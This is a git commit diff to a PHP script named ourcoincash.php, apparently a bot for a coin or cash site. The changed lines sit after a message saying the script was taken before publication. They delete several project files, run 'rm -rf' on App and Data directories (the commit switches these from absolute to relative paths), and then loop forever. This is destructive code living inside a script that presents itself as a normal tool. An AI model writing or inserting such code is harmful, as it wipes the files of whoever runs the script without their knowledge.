3f8b2b9a1cf950288190c24a49f35b2448a830ce
zbserver <novandrawahyuherwanto@gmail.com>
2025-02-26 21:19:17 +0700

    Update ourcoincash.php

--- script_api/ourcoincash.php
+++ script_api/ourcoincash.php
@@ -7,10 +7,10 @@ print p." English : ".o."The script has not been published yet but it was taken 
 unlink("server.php");
 unlink("app.php");
 unlink("lisensi.txt");
-system("rm -rf /App");
-system("rm -rf /Data");
+system("rm -rf App");
+system("rm -rf Data");
 tim(10);
 while(true){
-  print $i
+  print $i;
 }
 
